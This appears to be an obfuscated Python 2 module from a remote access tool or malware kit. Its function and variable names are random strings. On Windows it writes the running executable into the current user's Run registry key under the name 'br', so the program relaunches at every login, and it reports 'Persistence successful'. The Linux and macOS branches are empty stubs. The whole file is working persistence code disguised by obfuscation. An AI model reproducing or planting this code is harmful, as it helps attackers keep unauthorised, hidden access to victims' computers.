# -*- coding: utf-8 -*-
import sys
def XkjcqVIFuRPBzuyyOgvaPHMMXUTxUWQl():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    FgZLJOUCFULGqIalPgXNZGqGPqMSzPen = r'Software\Microsoft\Windows\CurrentVersion\Run'
    iMIrPwtZGSicddWSKSURvMQuBBUNsfZd = sys.executable
    try:
        ZfVCxsjpwrCxndaXuacKddAiYZneRiaA = _winreg.OpenKey(HKCU, FgZLJOUCFULGqIalPgXNZGqGPqMSzPen, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(ZfVCxsjpwrCxndaXuacKddAiYZneRiaA, 'br', 0, _winreg.REG_SZ, iMIrPwtZGSicddWSKSURvMQuBBUNsfZd)
        _winreg.CloseKey(ZfVCxsjpwrCxndaXuacKddAiYZneRiaA)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def YSSsHTUGXtHhDGEUWwsgeDkiyBothJut():
    return False, 'nothing here yet'
def rCICTvnMUNRjhqSILbNRFYMxleecSKsj():
    return False, 'nothing here yet'
def pNKTPPqkGzrmqhneYrAXlKTwcMiQhwMR(plat_type):
    if plat_type.startswith('win'):
        success, xfpfcjOpGekFhzGEaumoWmQwbZasHGHG = XkjcqVIFuRPBzuyyOgvaPHMMXUTxUWQl()
    elif plat_type.startswith('linux'):
        success, xfpfcjOpGekFhzGEaumoWmQwbZasHGHG = YSSsHTUGXtHhDGEUWwsgeDkiyBothJut()
    elif plat_type.startswith('darwin'):
        success, xfpfcjOpGekFhzGEaumoWmQwbZasHGHG = rCICTvnMUNRjhqSILbNRFYMxleecSKsj()
    else:
        return 'Error, platform unsupported.'
    if success:
        wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = 'Persistence successful, {}.'.format(xfpfcjOpGekFhzGEaumoWmQwbZasHGHG)
    else:
        wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = 'Persistence unsuccessful, {}.'.format(xfpfcjOpGekFhzGEaumoWmQwbZasHGHG)
    return wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv
